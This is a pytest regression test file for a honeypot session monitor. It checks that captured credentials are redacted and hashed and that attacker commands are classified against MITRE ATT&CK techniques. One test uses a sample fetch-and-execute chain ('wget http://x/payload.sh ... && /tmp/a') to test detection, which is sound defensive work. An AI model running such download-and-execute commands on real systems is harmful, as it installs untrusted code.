from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from production.workers.session_monitor import SessionMonitor
from production.classification.classification_pipeline import NotebookParityClassifier
from production.utils.credential_hmac import CredentialHasher
from production.utils.serialization import session_to_payload


def _command_event(session="s1", src_ip="203.0.113.10", command="whoami"):
    return {
        "eventid": "cowrie.command.input",
        "session": session,
        "src_ip": src_ip,
        "timestamp": "2026-05-12T00:00:00Z",
        "input": command,
    }


def test_credentials_are_redacted_and_hashed():
    monitor = SessionMonitor(
        credential_hasher=CredentialHasher(
            active_key_id="regression-key",
            keys={"regression-key": b"regression-test-key-material-32!!"},
        )
    )
    monitor.on_event({
        "eventid": "cowrie.login.success",
        "session": "cred-1",
        "src_ip": "203.0.113.10",
        "timestamp": "2026-05-12T00:00:00Z",
        "username": "root",
        "password": "secret123",
    })

    state = monitor.get_session("cred-1")
    assert state.login_password == "[REDACTED]"
    assert state.login_password_redacted == "[REDACTED]"
    assert state.login_password_hash.startswith("hmac-sha256-v1:regression-key:")
    assert "secret123" not in str(state.raw_events)
    assert state.raw_events[0]["password"] == "[REDACTED]"
    assert state.raw_events[0]["password_hash"] == state.login_password_hash


def test_raw_credentials_cannot_be_enabled_in_derived_session_state():
    with pytest.raises(ValueError, match="must not store plaintext credentials"):
        SessionMonitor(
            credential_policy={
                "store_raw_credentials": True,
            }
        )


def test_command_credentials_are_transient_but_not_in_derived_session_payload() -> None:
    observed_raw_commands: list[str] = []

    def classify(command: str) -> list[dict]:
        observed_raw_commands.append(command)
        return [{
            "command": command,
            "ttp": "T1059",
            "tactic": "execution",
            "source": "rule",
            "confidence": 1.0,
        }]

    monitor = SessionMonitor(
        classification_fn=classify,
        classification_policy={"strategy": "notebook_merge"},
    )
    secret = "derived-command-secret"
    commands = [
        f"sshpass -p {secret} ssh host",
        f"curl -u user:{secret} https://example.invalid",
        f"mysql -p{secret} exampledb",
        f"redis-cli -a {secret} ping",
    ]
    raw_events = []
    for index, command in enumerate(commands):
        event = _command_event(
            session="derived-command",
            command=command,
        )
        event["timestamp"] = f"2026-05-12T00:00:0{index}Z"
        raw_events.append(event)
        monitor.on_event(event)

    state = monitor.get_session("derived-command")
    assert state is not None
    payload = session_to_payload(state)
    encoded = json.dumps(payload, sort_keys=True)

    assert any(secret in command for command in observed_raw_commands)
    assert all(secret in event["input"] for event in raw_events)
    assert secret not in encoded
    assert all(secret not in command for command in state.commands)
    assert all(secret not in event["input"] for event in state.raw_events)
    assert all(
        secret not in json.dumps(event, sort_keys=True)
        for event in state.classification_events
    )
    assert all(
        secret not in command
        for commands_for_ttp in state.ttp_command_map.values()
        for command in commands_for_ttp
    )


def test_session_monitor_records_ordered_subcommand_classifications():
    command = "wget http://x/payload.sh -O /tmp/a && chmod +x /tmp/a && /tmp/a"

    class FakeMitre:
        def get_tactics(self, ttp):
            return {
                "T1105": ["command-and-control"],
                "T1059": ["execution"],
                "T1222": ["defense-evasion"],
            }.get(ttp, [])

        def get_name(self, ttp):
            return {
                "T1105": "Ingress Tool Transfer",
                "T1059": "Command and Scripting Interpreter",
                "T1222": "File and Directory Permissions Modification",
            }.get(ttp, ttp)

    classifier = NotebookParityClassifier(
        bert_fn=lambda _cmd: (None, 0.0),
        mitre_db=FakeMitre(),
    )
    monitor = SessionMonitor(
        mitre_db=FakeMitre(),
        classification_fn=classifier.classify,
        classification_policy={"strategy": "notebook_merge"},
    )
    monitor.on_event(_command_event(session="compound-1", command=command))

    state = monitor.get_session("compound-1")
    assert state.commands == [command]
    # Only the unconditional, trusted command mapping enters the observed
    # session TTP set.  Conditional RHS fragments remain audit-only until
    # their execution is independently observed.
    assert state.ttps == ["T1105"]
    assert state.tactics == ["command-and-control"]
    classified_commands = [
        event["command"]
        for event in state.classification_events
        if event.get("ttp")
    ]
    assert classified_commands == [
        "wget http://x/payload.sh -O /tmp/a",
        "chmod +x /tmp/a",
        "/tmp/a",
    ]
    assert all(event.get("original_command") == command for event in state.classification_events)
    assert state.ttp_command_map["T1105"] == ["wget http://x/payload.sh -O /tmp/a"]
    assert "T1222" not in state.ttp_command_map
    assert "T1059" not in state.ttp_command_map
    assert [event["source"] for event in state.classification_events] == [
        "rule",
        "rule",
        "rule",
    ]
    assert [event["evidence_tier"] for event in state.classification_events] == [
        "trusted_observation",
        "audit_only_candidate",
        "audit_only_candidate",
    ]
    assert all(
        event.get("fragment_execution") == "conditional_unproven"
        for event in state.classification_events[1:]
    )


if __name__ == "__main__":
    tests = [
        test_credentials_are_redacted_and_hashed,
        test_raw_credentials_cannot_be_enabled_in_derived_session_state,
        test_command_credentials_are_transient_but_not_in_derived_session_payload,
        test_session_monitor_records_ordered_subcommand_classifications,
    ]
    for test in tests:
        test()
    print(f"{len(tests)} regression tests passed")
